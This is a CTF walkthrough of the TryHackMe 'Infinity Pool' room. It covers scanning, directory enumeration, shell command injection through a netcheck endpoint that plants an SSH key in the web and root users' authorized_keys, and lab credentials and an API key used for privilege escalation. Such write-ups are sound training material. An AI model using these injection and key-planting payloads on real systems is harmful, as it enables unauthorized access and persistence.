# Comprehensive Guide to Solving the Infinity Pool CTF Room on TryHackMe

<p>Introduction</p>

<p>The <strong>Infinity Pool</strong> room on TryHackMe is an engaging and educational challenge combining network reconnaissance, web directory enumeration, command injection exploitation, internal dashboard access, and SSH key injection to achieve full root privileges.</p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fmd307zmfjxd00ox5akkl.png"><img alt=" " height="351" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fmd307zmfjxd00ox5akkl.png" width="800" /></a></p>

<p>..............</p>

<p>Phase 1: Reconnaissance &amp; Port Scanning</p>

<p>We begin by scanning the target using <code>nmap</code> to discover open ports and active services on the target server.</p>

<p>Command Used:<br />
..........................................................................</p>

<p>nmap -sV -sC </p>

<p>......................................................................</p>

<p>Explanation: Scans service versions, runs default scripts, and detects essential ports such as Port 22 (SSH) and Port 80 (HTTP Gunicorn).</p>

<p>Illustration:</p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fc69505ga3osnjwseyuai.png"><img alt=" " height="291" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fc69505ga3osnjwseyuai.png" width="800" /></a></p>

<p>..............................</p>

<p>Phase 2: Directory Enumeration with Gobuster</p>

<p>After confirming the web server is operational, we perform directory and file fuzzing using <code>gobuster</code> to find hidden administrative pages or internal tools.</p>

<p>Command Used:<br />
..........................................................................</p>

<p>gobuster dir -u http:// -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</p>

<p>..........................................................................</p>

<p>Explanation: Helps uncover hidden paths not visible to normal users.</p>

<p>Illustration:</p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fjuq6zlbb1kaclxkeu8je.png"><img alt=" " height="219" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fjuq6zlbb1kaclxkeu8je.png" width="800" /></a></p>

<p>...............................</p>

<p>Phase 3: Generating and Encoding an SSH Key Locally</p>

<p>Before executing the injection, we generate an SSH key pair on our attack box (Kali) and encode the public key in Base64 format to ensure smooth passage through command injection strings without character breaking:</p>

<ol>
<li>Generate the Key Locally:</li>
</ol>

<p>..........................................................................</p>

<p>ssh-keygen -t rsa -b 2048 -f ./ctf_key -N ""</p>

<p>..........................................................................</p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F6gznbmle5kqd10ncv2b7.png"><img alt=" " height="328" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F6gznbmle5kqd10ncv2b7.png" width="555" /></a></p>

<ol>
<li>Encode the Public Key to Base64 (and copy the output):</li>
</ol>

<p>..........................................................................</p>

<p>base64 -w0 ctf_key.pub</p>

<p>..........................................................................</p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F1ktqqwlnl024qid8exa1.png"><img alt=" " height="42" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F1ktqqwlnl024qid8exa1.png" width="792" /></a></p>

<p>....................................<br />
 Phase 4: Executing Command Injection &amp; Injecting the User Key</p>

<p>Using our encoded public key, we leverage the internal network check utility to inject the key and create the <code>.ssh</code> directory and authorization files for the <code>web</code> user:</p>

<p>Command Used:<br />
..........................................................................</p>

<p>curl -sS -X POST http:///internal/netcheck \<br />
  --data-urlencode "host=127.0.0.1;mkdir -p /home/web/.ssh;echo 'YOUR_PUB_KEY_BASE64' | base64 -d &gt; /home/web/.ssh/authorized_keys;chmod 700 /home/web/.ssh;chmod 600 /home/web/.ssh/authorized_keys;#"<br />
..........................................................................</p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F11dnvhrc9qqn4zgy2x0i.png"><img alt=" " height="321" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F11dnvhrc9qqn4zgy2x0i.png" width="799" /></a></p>

<p>...............................</p>

<p>Phase 5: Gaining Access and Reading the User Flag</p>

<p>Once the injection succeeds and the key is planted, you can seamlessly log into the standard user account via SSH and read the user flag:</p>

<p>SSH Connection Command:<br />
..........................................................................</p>

<p>ssh -o IdentitiesOnly=yes -i ctf_key web@</p>

<p>..........................................................................</p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F6532h8hq029exuvwcq5t.png"><img alt=" " height="380" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F6532h8hq029exuvwcq5t.png" width="800" /></a></p>

<p>..............................</p>

<p>Commands to read the flag after logging in:<br />
..........................................................................</p>

<p>cat user.txt</p>

<p>..........................................................................</p>

<p>Illustration:</p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fxi32ksi69ombtom0opes.png"><img alt=" " height="122" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fxi32ksi69ombtom0opes.png" width="799" /></a></p>

<p>User Flag: <code>THM{......................}</code></p>

<p>.......................</p>

<p>Phase 6: Extracting the Automation Key</p>

<p>By browsing the internal dashboard or voicemail interface via <code>127.0.0.1:8080/ucp</code>, we locate the data containing the secret automation key. <strong>This step is mandatory prior to exploitation</strong> so we can use the key later as a Bearer Token.</p>

<p>Illustration:</p>

<p>Extracted Key: cc_auto_7b3f9a1c4e0d2f6a  </p>

<p><a href="http://127.0.0.1:8080" rel="noopener noreferrer">http://127.0.0.1:8080</a><br />
<a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fu0jzbmve4znskdzhtdqg.png"><img alt=" " height="695" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fu0jzbmve4znskdzhtdqg.png" width="800" /></a><br />
<a href="http://127.0.0.1:8080/ucp" rel="noopener noreferrer">http://127.0.0.1:8080/ucp</a></p>

<p>username : FreePBXUCPTemplateCreator</p>

<p>password : St4yN0t1c3d_2026</p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F6gmqmvqs6lrdrmlum72x.png"><img alt=" " height="351" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F6gmqmvqs6lrdrmlum72x.png" width="800" /></a></p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F0oz3ri0ho37p838e2ncg.png"><img alt=" " height="818" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F0oz3ri0ho37p838e2ncg.png" width="800" /></a></p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fopz8vvob4ip5n4kro9wh.png"><img alt=" " height="669" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fopz8vvob4ip5n4kro9wh.png" width="604" /></a></p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fwv6b1cvsp4uxmn168tmw.png"><img alt=" " height="353" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fwv6b1cvsp4uxmn168tmw.png" width="800" /></a></p>

<p>.......................</p>

<p>Phase 7: Privilege Escalation &amp; Reading the Root Flag</p>

<p>Using the automation service alongside our previously discovered automation key (<code>cc_auto_7b3f9a1c4e0d2f6a</code>), we inject our SSH public key directly into the root directory to log in instantly and capture the final root flag:</p>

<p>Advanced Root Injection Command:<br />
..........................................................................<br />
curl -sS -X POST http:///internal/netcheck \<br />
  --data-urlencode "host=127.0.0.1;curl -sS -X POST <a href="http://127.0.0.1:9000/jobs/export" rel="noopener noreferrer">http://127.0.0.1:9000/jobs/export</a> -H 'Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a' -H 'Content-Type: application/json' --data-binary '{\"report\":\"x;mkdir -p /root/.ssh;echo '\''YOUR_PUB_KEY_BASE64'\'' | base64 -d &gt;&gt; /root/.ssh/authorized_keys;chmod 700 /root/.ssh;chmod 600 /root/.ssh/authorized_keys;#\"}'"</p>

<p>..........................................................................</p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F2z5z3lyqd2mihb65zpv4.png"><img alt=" " height="338" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F2z5z3lyqd2mihb65zpv4.png" width="799" /></a></p>

<p>..............................</p>

<p>Connect as Root and Read the Flag:<br />
..........................................................................</p>

<p>ssh -o IdentitiesOnly=yes -i ctf_key root@</p>

<p>..........................................................................<br />
<a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Famaurbu5kbygdnec21zf.png"><img alt=" " height="408" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Famaurbu5kbygdnec21zf.png" width="799" /></a><br />
......................<br />
ls</p>

<p>cat /root.txt<br />
.....................................<br />
Illustration:</p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fbn3u4eb0kkncfm35re0y.png"><img alt=" " height="127" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fbn3u4eb0kkncfm35re0y.png" width="800" /></a></p>

<p>Root Flag: <code>THM{.....................}</code></p>

[Read original article on DEV](https://dev.to/mohammadali_30/comprehensive-guide-to-solving-the-infinity-pool-ctf-room-on-tryhackme-3c7f)